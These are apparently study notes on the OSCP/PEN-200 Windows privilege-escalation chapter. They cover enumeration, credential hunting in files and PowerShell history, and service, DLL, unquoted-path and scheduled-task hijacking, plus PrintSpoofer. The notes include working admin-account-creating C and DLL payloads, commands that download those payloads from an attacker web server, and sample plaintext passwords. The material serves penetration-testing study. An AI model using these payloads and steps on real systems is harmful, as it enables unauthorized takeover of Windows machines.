# PEN-200 Chapter 16 - Windows Privilege Escalation

> [!summary]

# 16.1 Enumerating Windows

The chapter begins with the idea that every Windows target is different because of OS version, patch level, installed software, local users/groups, service configuration, permissions, and network configuration. Before trying random privilege-escalation techniques, build **situational awareness** and use the findings to identify realistic escalation paths.

The chapter emphasizes that privilege escalation is not always an exploit. Credentials in notes/configuration files, PowerShell history, writable service files, scheduled-task actions, or overly powerful assigned privileges can all be enough.

## 16.1.1 Understanding Windows Privileges and Access Control Mechanisms

### Security Identifiers (SIDs)

Windows identifies security principals such as users and groups using **SIDs**, not their display names. Local account/group SIDs are generated by the Local Security Authority (LSA); domain principal SIDs are generated by a Domain Controller.

Basic SID form:

```text
S-R-X-Y
```

Meaning:

- `S` - identifies the value as a SID.
- `R` - revision; normally `1`.
- `X` - identifier authority; `5` commonly means NT Authority.
- `Y` - one or more sub-authorities, including the domain/machine identifier and the **RID** (Relative Identifier).

Example:

```text
S-1-5-21-1336799502-1441772794-948155058-1001
```

The final value is the RID. RIDs around `1000+` normally identify accounts created on the system/domain, while lower values are often well-known/built-in principals.

Important well-known SIDs from the chapter:

```text
S-1-0-0                         Nobody
S-1-1-0                         Everybody
S-1-5-11                        Authenticated Users
S-1-5-18                        Local System
S-1-5-<domainidentifier>-500    Administrator
```

### Access tokens

After successful authentication, Windows creates an **access token** describing the user's security context. It contains the user's SID, group SIDs, privileges, and other security attributes.

- A **primary token** is associated with a process and normally reflects the logged-on user's context.
- A thread may instead use an **impersonation token**, letting the thread operate in another security context. This concept becomes important later when abusing `SeImpersonatePrivilege`.

### Mandatory Integrity Control

Windows also applies **integrity levels**, which act as levels of trust. A lower-integrity process cannot normally write to a higher-integrity object even if discretionary permissions might otherwise allow it.

Common levels:

```text
System  -> SYSTEM/kernel-level processes
High    -> elevated administrator processes
Medium  -> normal standard-user processes
Low     -> heavily restricted/sandboxed processes
```

Commands/tools mentioned for checking integrity/security context:

```powershell
whoami /groups
icacls <file-or-directory>
```

- `whoami /groups` - shows group membership and integrity-related group information for the current token.
- `icacls` - displays or modifies Windows file/directory ACLs; later used heavily to find writable service binaries/directories.
- **Process Explorer** - GUI Sysinternals tool useful for inspecting process details, including integrity levels.

### User Account Control (UAC)

UAC causes an administrative user to normally operate with a **filtered/standard token**. A second full administrative token is available when the user consents to elevation. Therefore, simply being a member of Administrators does not mean every process is already running at high integrity.

> [!important]
> In OSCP-style work, always distinguish **group membership**, **assigned privileges**, and the **effective security context of the process/token**.

## 16.1.2 Situational Awareness

After initial access, enumerate before attacking. The chapter's minimum checklist is:

- current username and hostname
- current user's groups
- existing users and groups
- OS/version/architecture
- network interfaces/routes/connections
- installed applications
- running processes

### Connect to an existing bind shell

```bash
nc 192.168.50.220 4444
```

- `nc` - Netcat, used here to connect to a bind shell already listening on the target.
- `192.168.50.220` - target IP.
- `4444` - target listening port.
- Use when you already have a shell listener on the victim and need interactive command execution.

### Identify current user and host

```cmd
whoami
```

Returns a value such as:

```text
clientwk220\dave
```

Use it immediately after initial access to confirm the security context you obtained.

### Enumerate current user's group membership

```cmd
whoami /groups
```

- `/groups` - prints group memberships from the current access token.
- Look for high-value groups such as `Administrators`, `Backup Operators`, `Remote Desktop Users`, and `Remote Management Users`, plus non-standard/custom groups.

The chapter's example found `helpdesk` and `Remote Desktop Users`, showing that even a non-admin user may have useful access.

### Start PowerShell

```cmd
powershell
```

Used because many modern Windows enumeration commands in the chapter are PowerShell cmdlets.

### Enumerate local users

```powershell
Get-LocalUser
```

Alternative mentioned:

```cmd
net user
```

Use these to identify local accounts, disabled accounts, likely admin accounts, backup accounts, and naming patterns such as separate normal/admin accounts (`dave` / `daveadmin`).

### Enumerate local groups

```powershell
Get-LocalGroup
```

Alternative mentioned:

```cmd
net localgroup
```

Look beyond built-in groups. Custom group descriptions may reveal scope or privilege, such as a group that is administrative on a specific set of workstations.

### Enumerate members of a specific local group

```powershell
Get-LocalGroupMember adminteam
Get-LocalGroupMember Administrators
```

- Positional group-name argument selects the group.
- Use it to map interesting group names to actual users/accounts.

### Inspect a specific user's local memberships

```cmd
net user steve
```

Later examples also use:

```cmd
net user backupadmin
```

Use `net user <username>` to inspect the account and its local-group memberships. This is helpful when deciding whether discovered credentials can be used through RDP, WinRM, or for local administration.

### Identify OS, build, and architecture

```cmd
systeminfo
```

Important fields include:

- OS name
- OS version/build
- system type (`x64-based PC`, etc.)

Why it matters:

- exploit compatibility depends on OS/build/patch level;
- payload architecture must match the target architecture;
- build numbers help identify exact Windows versions.

### Enumerate network interfaces

```cmd
ipconfig /all
```

- `/all` - includes complete adapter information such as IP, mask, gateway, DNS, DHCP state, and MAC.
- Use this to understand the target subnet and identify potential routes/pivoting opportunities.

### Show routing table

```cmd
route print
```

Use it to identify networks reachable from the compromised host that may not be directly reachable from Kali.

### Show active/listening network connections with PIDs

```cmd
netstat -ano
```

Arguments:

- `-a` - all active TCP connections plus listening TCP/UDP ports.
- `-n` - numeric addresses/ports; no name resolution.
- `-o` - include owning process ID.

Use the PID to correlate a listener with `Get-Process`. In the chapter, this revealed web, MySQL, RDP, and the existing bind-shell connection.

### Enumerate installed 32-bit applications

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

### Enumerate installed 64-bit applications

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

Explanation:

- `Get-ItemProperty` - reads Registry key/value properties.
- `HKLM:` - HKEY_LOCAL_MACHINE PowerShell Registry provider.
- `Wow6432Node` - commonly contains 32-bit application registration on 64-bit Windows.
- `| select displayname` - passes results to `Select-Object` (alias `select`) and outputs only the `DisplayName` property.

The chapter found KeePass, 7-Zip, and XAMPP. Installed-software enumeration can suggest local configuration files, password stores, or public-exploit research targets.

> [!note]
> Registry uninstall keys are not guaranteed to list every application. Also inspect `C:\Program Files`, `C:\Program Files (x86)`, and user download locations.

### Enumerate running processes

```powershell
Get-Process
```

Use it to correlate PIDs from `netstat -ano`, confirm which applications are actually running, and identify interesting third-party software.

## 16.1.3 Hidden in Plain View

This section shows that sensitive information stored by users or applications can be a complete privilege-escalation path without exploiting software.

### Search the whole C: drive for KeePass databases

```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

Arguments:

- `-Path C:\` - search starting at the root of `C:`.
- `-Include *.kdbx` - include KeePass database files.
- `-File` - return files rather than directories.
- `-Recurse` - recursively search subdirectories.
- `-ErrorAction SilentlyContinue` - suppress access-denied and similar errors during broad searches.

Use this after discovering KeePass or whenever you suspect local password databases.

### Search XAMPP configuration/text files

```powershell
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```

Use application-specific knowledge from earlier enumeration to narrow searches to configuration files likely to hold credentials.

### Read file contents

```powershell
type C:\xampp\passwords.txt
type C:\xampp\mysql\bin\my.ini
```

PowerShell equivalents/aliases covered in the chapter:

```powershell
cat Desktop\asdf.txt
Get-Content <file>
```

`type` and `cat` are aliases for `Get-Content` in PowerShell. Use them to inspect notes and configuration files quickly.

### Search a user's home directory for likely documents

```powershell
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

This is a focused search for common office/document formats where credentials, onboarding notes, meeting notes, or operational details may be stored.

### Re-check privileges/access as a newly compromised user

After discovering another user's credentials, the chapter stresses a key workflow rule: **enumerate again as the new user**. Different users may be able to read files that the original user could not.

Example:

```powershell
type C:\xampp\mysql\bin\my.ini
```

The second user could read the file and found a password associated with `backupadmin`.

### Run a process as another local/domain user

```powershell
runas /user:backupadmin cmd
```

Arguments:

- `/user:backupadmin` - specifies the target user.
- `cmd` - program to launch in that user's context.

Use when you have valid credentials and an interactive GUI/session that can accept the password prompt. The chapter notes that the standard `runas` password prompt is generally not practical through common non-GUI bind shells/WinRM shells.

Other methods mentioned for executing as another user when requirements are satisfied:

- **RDP** - if the account has Remote Desktop logon rights / group membership.
- **WinRM** - if the account can remotely manage the host.
- **Scheduled Tasks** - possible if the account has appropriate batch-logon rights/credentials.
- **PsExec (Sysinternals)** - can be useful when the target user has an active session and circumstances permit.

> [!oscp]
> Credential discovery is often both **Privilege Escalation** and **Credentials** in the attack chain. A password found locally can move you to a more privileged local account or become reusable against other systems/services.

## 16.1.4 Information Goldmine PowerShell

PowerShell can preserve sensitive information in multiple places even when a user thinks they cleared their command history.

The chapter focuses on:

- PowerShell history (`Get-History`)
- PSReadLine history file
- PowerShell Transcription
- Script Block Logging (conceptually)

### Check PowerShell's current-session history

```powershell
Get-History
```

Use it first, but do not stop if it is empty.

### Clear PowerShell history

```powershell
Clear-History
```

Important lesson: this clears PowerShell's own history but does **not necessarily clear the PSReadLine persistent history file**.

### Locate PSReadLine's persistent history file

```powershell
(Get-PSReadlineOption).HistorySavePath
```

Explanation:

- `Get-PSReadLineOption` - returns PSReadLine configuration.
- parentheses evaluate the command first.
- `.HistorySavePath` - selects only the `HistorySavePath` property.

Example path:

```text
C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### Read the persistent history file

```powershell
type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Commands seen in the chapter's history example include:

```powershell
$PSVersionTable
Register-SecretVault -Name pwmanager -ModuleName SecretManagement.keepass -VaultParameters $VaultParams
Set-Secret -Name "Server02 Admin PW" -Secret "paperEarMonitor33@" -Vault pwmanager
cd C:\
ls
cd C:\xampp
ls
type passwords.txt
Clear-History
Start-Transcript -Path "C:\Users\Public\Transcripts\transcript01.txt"
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
exit
Stop-Transcript
```

What these reveal:

- `Register-SecretVault` - registers a secret vault; here it suggested KeePass-backed secret storage.
- `Set-Secret` - stores a secret; arguments in history may directly expose secret names/values.
- `Start-Transcript -Path ...` - begins PowerShell transcription and exposes where the transcript is stored.
- `Enter-PSSession -ComputerName ... -Credential ...` - starts a PowerShell remoting session, normally over WinRM unless configured otherwise.
- `Stop-Transcript` - stops recording.

### Read a PowerShell transcript

```powershell
type C:\Users\Public\Transcripts\transcript01.txt
```

The transcript can contain commands that did not appear in the PSReadLine history, including credential-object creation.

### Build a PSCredential object from a plaintext password

```powershell
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
```

Arguments and purpose:

- `ConvertTo-SecureString` - converts input into a `SecureString`.
- `-AsPlainText` - tells PowerShell the source is plaintext.
- `-Force` - permits this conversion despite the insecure plaintext input.
- `New-Object System.Management.Automation.PSCredential(...)` - creates a credential object from username + SecureString password.
- `Enter-PSSession` - opens an interactive PowerShell remoting session.
- `-ComputerName CLIENTWK220` - destination host.
- `-Credential $cred` - supplies the PSCredential object.

The chapter notes that PowerShell remoting normally uses WinRM, but PowerShell can also support remoting over SSH.

### Use Evil-WinRM for a more stable WinRM shell

```bash
evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
```

Arguments:

- `-i` - target IP.
- `-u` - username.
- `-p` - password.
- the `!` characters are escaped for the local shell used in the example.

Why use it: the chapter observed odd behavior when nesting `Enter-PSSession` inside a bind shell. Evil-WinRM provided a cleaner direct WinRM session and also supports penetration-testing conveniences such as file transfer and pass-the-hash.

### Disable PSReadLine history saving (defensive concept mentioned)

```powershell
Set-PSReadlineOption -HistorySaveStyle SaveNothing
```

This is mentioned to explain how an administrator could prevent persistent PSReadLine command recording.

> [!important]
> PowerShell artifacts should be checked even if `Get-History` is empty. `Clear-History` does not imply that PSReadLine history or transcript files are gone.

## 16.1.5 Automated Enumeration

Manual enumeration teaches you what matters, but real environments may contain thousands of files/settings. The chapter uses **winPEAS** and mentions **Seatbelt** and **JAWS** as alternatives.

### Tools

- **winPEAS** - broad Windows privilege-escalation enumeration tool.
- **Seatbelt** - host-survey/security-enumeration tool.
- **JAWS** - PowerShell-based Windows enumeration script.
- AV may block these tools; if so, use manual enumeration or techniques from the antivirus-evasion material.

### Copy winPEAS on Kali

```bash
cp /usr/share/peass/winpeas/winPEASx64.exe .
```

Copies Kali's 64-bit winPEAS binary into the current directory for serving.

### Start a simple HTTP server

```bash
python3 -m http.server 80
```

- `-m http.server` - runs Python's built-in HTTP server module.
- `80` - listening port.
- Use to transfer tools/payloads from Kali to a target when HTTP egress/access is available.

### Download winPEAS on Windows

```powershell
iwr -uri http://192.168.118.3/winPEASx64.exe -Outfile winPEAS.exe
```

- `iwr` - alias for `Invoke-WebRequest`.
- `-Uri` - source URL.
- `-OutFile` - destination filename.

### Execute winPEAS

```powershell
.\winPEAS.exe
```

Use results as a lead generator, not ground truth. In the chapter, winPEAS:

- provided a large amount of useful user/group/system/process/service/task/network information;
- misidentified the OS version;
- failed to surface some manually discovered password/history/transcript findings.

> [!warning]
> **Automated enumeration complements manual enumeration; it does not replace it.** Validate important findings yourself.

# 16.2 Leveraging Windows Services

A Windows service is a long-running executable managed by the **Service Control Manager (SCM)**. Services may run as `LocalSystem`, `Network Service`, `Local Service`, a local user, or a domain user. Because services often run with strong privileges, their binaries, DLLs, paths, and permissions are major privilege-escalation targets.

Tools/management interfaces mentioned:

- `services.msc`
- PowerShell service cmdlets such as `Get-Service`, `Start-Service`, `Stop-Service`, `Restart-Service`
- `sc.exe`
- `Get-CimInstance` / WMI `win32_service`

## 16.2.1 Service Binary Hijacking

### Core idea

If a low-privileged user can **modify/replace the executable file used by a high-privileged service**, the user can substitute a malicious executable. When the service starts again, the malicious binary executes with the service's privileges.

### Enumerate running services and binary paths

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

Explanation:

- `Get-CimInstance -ClassName win32_service` - queries the Windows service WMI/CIM class.
- `Select Name,State,PathName` - keeps the most relevant fields.
- `Where-Object {$_.State -like 'Running'}` - filters to running services.

The chapter notes that non-admin service enumeration through some network logons (such as WinRM/bind shell) may produce permission errors; an interactive logon such as RDP may behave differently.

Look especially for **non-Microsoft/user-installed service paths** outside `C:\Windows\System32`, because their permissions are more likely to be weak.

### Check binary ACLs with icacls

```powershell
icacls "C:\xampp\apache\bin\httpd.exe"
icacls "C:\xampp\mysql\bin\mysqld.exe"
```

Important permission masks from the chapter:

```text
F   Full access
M   Modify
RX  Read and execute
R   Read-only
W   Write-only
```

`(I)` indicates inherited permissions. A writable executable with permissions intentionally granted to a broad group such as `BUILTIN\Users` is especially suspicious.

Alternative ACL cmdlet mentioned:

```powershell
Get-ACL <path>
```

### Malicious service replacement code from the chapter

```c
#include <stdlib.h>
int main ()
{
    int i;

    i = system ("net user dave2 password123! /add");
    i = system ("net localgroup administrators dave2 /add");

    return 0;
}
```

What it does:

- `net user dave2 password123! /add` - creates local user `dave2` with the supplied password.
- `net localgroup administrators dave2 /add` - adds that user to local Administrators.
- If this executable is launched by a SYSTEM service, the account-creation commands inherit enough privilege to succeed.

### Cross-compile a 64-bit Windows executable on Kali

```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

- `x86_64-w64-mingw32-gcc` - MinGW cross-compiler targeting 64-bit Windows.
- `adduser.c` - input source file.
- `-o adduser.exe` - output executable name.

### Download and replace the vulnerable service binary

```powershell
iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe
move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
```

Workflow:

1. download the malicious file;
2. move the legitimate binary somewhere safe so it can be restored;
3. move the malicious binary into the exact service-binary path.

### Attempt to stop the service

```powershell
net stop mysql
```

A non-admin may receive `Access is denied`. If you cannot restart the service directly, check whether it starts automatically and whether a reboot is possible.

### Check service startup type

```powershell
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
```

If `StartMode` is `Auto`, a reboot can cause the service to execute the replaced binary.

### Check assigned token privileges

```cmd
whoami /priv
```

Use this whenever you are evaluating privilege-based attack paths or operations such as shutdown/reboot. The chapter specifically checks for `SeShutdownPrivilege` here.

### Reboot immediately

```cmd
shutdown /r /t 0
```

Arguments:

- `/r` - reboot rather than power off.
- `/t 0` - zero-second delay.

> [!warning]
> The chapter explicitly warns against rebooting production systems casually. In a real assessment, coordinate disruptive operations with the client and respect the rules of engagement.

### Confirm administrator-group membership

```powershell
Get-LocalGroupMember administrators
```

Alternative confirmation used elsewhere:

```cmd
net localgroup administrators
```

### PowerUp enumeration/exploitation helper

Copy it on Kali:

```bash
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
python3 -m http.server 80
```

Download and load it on target:

```powershell
iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-ModifiableServiceFile
```

Explanation:

- `powershell -ep bypass` - starts a PowerShell process with ExecutionPolicy set to Bypass for that process.
- `. .\PowerUp.ps1` - dot-sources the script so its functions become available in the current session.
- `Get-ModifiableServiceFile` - identifies service-related files the current user can modify.

The chapter then tries the suggested abuse function:

```powershell
Install-ServiceBinary -Name 'mysql'
```

PowerUp incorrectly fails in this example even though manual replacement is possible. The issue is traced to path parsing inside `Get-ModifiablePath` when service arguments contain another path.

Diagnostic examples:

```powershell
$ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe' | Get-ModifiablePath -Literal
$ModifiableFiles

$ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument' | Get-ModifiablePath -Literal
$ModifiableFiles

$ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument -conf=C:\test\path' | Get-ModifiablePath -Literal
$ModifiableFiles
```

Lesson: use automated results to **identify** a potential weakness, then manually verify/exploit it if the automation breaks.

`msfvenom` is also mentioned as an alternative way to generate an executable payload (for example, a reverse-shell executable), though the chapter's worked example uses the custom account-creation binary.

## 16.2.2 Service DLL Hijacking

### Core idea

If a service loads a DLL that a low-privileged user can replace, or attempts to load a **missing DLL** from a writable directory in the DLL search order, a malicious DLL can execute in the service's context.

### Standard DLL search order shown in the chapter

```text
1. Application directory
2. System directory
3. 16-bit system directory
4. Windows directory
5. Current directory
6. Directories listed in PATH
```

With Safe DLL Search Mode disabled, the current directory moves much earlier in the search order.

### Enumerate candidate services

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

The example focuses on `BetaService` whose binary is in a user's Documents directory.

### Check permissions on the service binary

```powershell
icacls .\Documents\BetaServ.exe
```

If the binary itself is not writable, investigate its DLL dependencies.

### Process Monitor (Procmon)

**Process Monitor** from Sysinternals is used to see file-system/registry/process activity and detect missing DLL loads.

Workflow in the chapter:

1. run `Procmon64.exe` with administrator rights;
2. add a filter:
   - Column: `Process Name`
   - Relation: `is`
   - Value: `BetaServ.exe`
   - Action: `Include`
3. restart the service;
4. look for `CreateFile` operations returning `NAME NOT FOUND` for DLL names.

Because Procmon itself needs elevated rights, in a real engagement you can copy the service executable to a system you control, recreate/install it there, and monitor it locally.

### Restart the service

```powershell
Restart-Service BetaService
```

Use when you have permission to restart the target service and need it to re-run DLL loading.

### Show PATH environment variable

```powershell
$env:path
```

Use this to compare the observed DLL-search attempts with directories from the process environment.

### Generic DLL entry-point code shown in the chapter

```cpp
BOOL APIENTRY DllMain(
    HANDLE hModule,          // Handle to DLL module
    DWORD ul_reason_for_call,// Reason for calling function
    LPVOID lpReserved )      // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
            break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
            break;
        case DLL_THREAD_DETACH: // A thread exits normally.
            break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
            break;
    }
    return TRUE;
}
```

`DLL_PROCESS_ATTACH` is the key case for code that should execute when a process loads the DLL.

### Malicious DLL code used in the chapter

```cpp
#include <stdlib.h>
#include <windows.h>
BOOL APIENTRY DllMain(
    HANDLE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved )
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH:
            int i;
            i = system ("net user dave2 password123! /add");
            i = system ("net localgroup administrators dave2 /add");
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
```

### Cross-compile the DLL

```bash
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```

Arguments:

- `myDLL.cpp` - input source.
- `--shared` - build a shared library/DLL rather than a normal executable.
- `-o myDLL.dll` - output DLL name.

### Place the missing DLL in the writable application directory

```powershell
cd Documents
iwr -uri http://192.168.119.3/myDLL.dll -Outfile myDLL.dll
net user
```

- `cd Documents` - moves to the service binary's application directory, first in the search order.
- `iwr ... -OutFile myDLL.dll` - downloads the DLL using the exact missing filename.
- `net user` - baseline check before triggering exploitation.

### Trigger DLL loading and verify

```powershell
Restart-Service BetaService
net user
net localgroup administrators
```

If the service runs as a privileged account and loads your DLL, your DLL code executes with that service context.

## 16.2.3 Unquoted Service Paths

### Core idea

If a service's executable path:

1. contains spaces,
2. is not surrounded by quotes, and
3. passes through a directory where you can write a strategically named executable,

Windows may execute your binary before reaching the intended service executable.

Example path:

```text
C:\Program Files\My Program\My Service\service.exe
```

Windows may try paths in this order:

```text
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My Service\service.exe
```

### Enumerate services and paths

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
```

The chapter's target is:

```text
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

### Quickly find non-Windows, unquoted service paths with WMIC/findstr

Run this from `cmd.exe` in the chapter to avoid PowerShell quote-escaping complications:

```cmd
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

Breakdown:

- `wmic service get name,pathname` - lists service names and executable paths.
- first `findstr /i /v "C:\Windows\\"`:
  - `/i` - case-insensitive.
  - `/v` - invert match (print lines that do **not** match).
  - removes ordinary Windows-directory services from attention.
- second `findstr /i /v """` - removes lines containing quotes, leaving unquoted candidates.

PowerShell alternative mentioned: `Select-String`.

### Check whether you can control service start/stop

```powershell
Start-Service GammaService
Stop-Service GammaService
```

If you can restart it yourself, you can trigger the attack without waiting for a reboot/admin action.

### Calculate candidate executable paths

For the chapter's path:

```text
C:\Program.exe
C:\Program Files\Enterprise.exe
C:\Program Files\Enterprise Apps\Current.exe
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

### Check ACLs on each candidate directory

```powershell
icacls "C:\"
icacls "C:\Program Files"
icacls "C:\Program Files\Enterprise Apps"
```

The useful finding is a candidate directory where the current user/group has write permission. In the example, `BUILTIN\Users` can write to `C:\Program Files\Enterprise Apps`.

### Place the malicious executable under the interpreted name

```powershell
iwr -uri http://192.168.119.3/adduser.exe -Outfile Current.exe
copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
```

The filename must match the executable Windows will try at that point in path parsing.

### Trigger and verify

```powershell
Start-Service GammaService
net user
net localgroup administrators
```

The service may report a start failure if your executable does not behave like the original service, but your code can still have executed before the error.

### PowerUp detection/exploitation

```powershell
iwr http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-UnquotedService
```

`Get-UnquotedService` identifies potentially vulnerable unquoted service paths and reports useful fields such as modifiable paths, service run-as account, restart permission, and a suggested abuse function.

Automated exploitation shown:

```powershell
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
Restart-Service GammaService
net user
net localgroup administrators
```

- `Write-ServiceBinary` - PowerUp helper that writes an executable at the selected hijack location.
- `-Name` - target service.
- `-Path` - chosen writable hijack path.

In the chapter, PowerUp's default payload creates user `john` with password `Password123!` and adds it to Administrators.

# 16.3 Abusing Other Windows Components

This learning unit moves beyond services and examines **Scheduled Tasks** plus exploit-based privilege escalation.

## 16.3.1 Scheduled Tasks

A Scheduled Task has three critical properties from an attacker's perspective:

1. **Principal** - which user runs the task?
2. **Trigger** - when/how often will it run?
3. **Action** - which executable/script does it run?

A task is interesting when it runs as a more privileged user (e.g., admin/SYSTEM), will run soon/repeatedly, and calls an executable/script/DLL location you can modify.

### Enumerate scheduled tasks

PowerShell option mentioned:

```powershell
Get-ScheduledTask
```

Command used in the example:

```cmd
schtasks /query /fo LIST /v
```

Arguments:

- `/query` - query existing tasks.
- `/fo LIST` - output format is a list.
- `/v` - verbose; show all properties.

Fields to inspect:

- `Author`
- `TaskName`
- `Task To Run`
- `Run As User`
- `Next Run Time`
- schedule/trigger details

### Check ACLs on the task's action executable

```powershell
icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
```

If the task runs as a privileged principal but calls a file you can overwrite, you can replace that action file.

### Download and replace the action executable

```powershell
iwr -Uri http://192.168.119.3/adduser.exe -Outfile BackendCacheCleanup.exe
move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
move .\BackendCacheCleanup.exe .\Pictures\
```

Workflow:

1. download a replacement under the expected filename;
2. back up the legitimate file;
3. move the replacement into the action path;
4. wait for the next trigger.

### Verify after the task fires

```cmd
net user
net localgroup administrators
```

The chapter's repeating task executed the replacement in the context of `daveadmin`, creating the administrative user from the payload.

> [!tip]
> Service-binary hijacking and Scheduled-Task action hijacking use the same fundamental pattern: **find a privileged execution mechanism that launches a file you can modify**.

## 16.3.2 Using Exploits

The chapter groups privilege-escalation exploits into three broad categories.

### 1. Application-based vulnerabilities

If a locally installed application runs with administrative permissions and has a code-execution vulnerability, exploiting it can lead to privilege escalation.

### 2. Windows kernel vulnerabilities

Kernel exploits can directly elevate privilege, but they are advanced and may crash the target. In a real assessment, their use depends on rules of engagement, availability requirements, and risk tolerance.

### 3. Abuse of assigned Windows privileges

Privileges highlighted as potentially useful for escalation include:

```text
SeImpersonatePrivilege
SeBackupPrivilege
SeAssignPrimaryToken
SeLoadDriver
SeDebug
```

The worked example focuses on **SeImpersonatePrivilege**.

### Check privileges

```cmd
whoami /priv
```

Look for `SeImpersonatePrivilege`. It is commonly present in service contexts such as `LOCAL SERVICE`, `NETWORK SERVICE`, and certain IIS/application-pool contexts.

### Named pipes + impersonation concept

A named-pipe server can receive a connection from a client. If the server process has `SeImpersonatePrivilege`, under the right circumstances it can impersonate the connecting client's token. The attack therefore becomes:

1. control/create a named pipe;
2. coerce a privileged process (ideally SYSTEM) to authenticate/connect to it;
3. impersonate that privileged token;
4. launch a process in the impersonated context.

### PrintSpoofer

The chapter uses **PrintSpoofer** to exploit a printer-bug-related path that coerces `NT AUTHORITY\SYSTEM` into connecting to a controlled named pipe, then leverages `SeImpersonatePrivilege`.

Download on Kali:

```bash
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
python3 -m http.server 80
```

- `wget <URL>` - downloads the 64-bit PrintSpoofer executable.
- Python HTTP server exposes it to the target.

Download on Windows:

```powershell
iwr -uri http://192.168.119.2/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
```

Execute it for an interactive SYSTEM PowerShell:

```powershell
.\PrintSpoofer64.exe -i -c powershell.exe
```

Arguments:

- `-i` - interact with the created process in the current console.
- `-c powershell.exe` - command to execute after obtaining the impersonated SYSTEM context.

Verify:

```powershell
whoami
```

Expected privileged context in the example:

```text
nt authority\system
```

Alternative SeImpersonate-abuse families mentioned:

- RottenPotato
- SweetPotato
- JuicyPotato
- other "Potato" variants

> [!oscp]
> Always check `whoami /priv` early. An assigned privilege can be a more direct route than hunting for a kernel exploit.

# 16.4 Wrapping Up

The chapter's overall Windows privilege-escalation strategy is:

1. **Enumerate manually** to understand the machine, accounts, network, software, services, and processes.
2. **Search for sensitive information** in files and application configuration.
3. **Inspect PowerShell artifacts**, especially PSReadLine history and transcripts.
4. **Run an automated enumerator** such as winPEAS, but validate its findings manually.
5. **Analyze Windows services** for writable binaries, writable/missing DLLs, and unquoted service paths.
6. **Analyze Scheduled Tasks** for privileged principals executing modifiable files.
7. **Check assigned privileges** and consider exploit-based options only when appropriate.
8. If local privilege escalation is not possible, do not get stuck indefinitely; use other access, credentials, services, or network paths to continue the assessment.

The chapter notes that these are common techniques, not an exhaustive list. Windows privilege escalation is broad and constantly evolving.

# Attack Chain Connection

> [!note]
> The chain below is a synthesis of how this chapter fits into the broader OSCP/PEN-200 workflow. Chapter 16 itself is primarily about **local Windows Privilege Escalation**, with strong connections to Credentials and Pivoting.

```text
Recon -> Enumeration -> Initial Access -> Privilege Escalation -> Credentials -> Pivoting -> AD -> Proof
```

## Recon

Chapter 16 is mostly post-compromise, but earlier recon determines why you obtained access to this Windows machine and which exposed service or client-side vector gave you the foothold.

## Enumeration

After the foothold, perform **local enumeration again**:

```text
whoami / whoami /groups / whoami /priv
Get-LocalUser / Get-LocalGroup / Get-LocalGroupMember
systeminfo
ipconfig /all
route print
netstat -ano
Get-Process
installed-software registry queries
service enumeration
scheduled-task enumeration
```

This post-exploitation enumeration is the bridge between Initial Access and Privilege Escalation.

## Initial Access

The chapter assumes you already have an unprivileged shell/session. Examples include a bind shell, RDP access, WinRM, or a foothold gained through a client-side/application attack.

## Privilege Escalation  **<- Core of Chapter 16**

Primary routes demonstrated:

```text
Plaintext credentials / config files
PowerShell history / transcripts
Writable service binary
Missing/writable service DLL
Unquoted service path
Writable Scheduled Task action
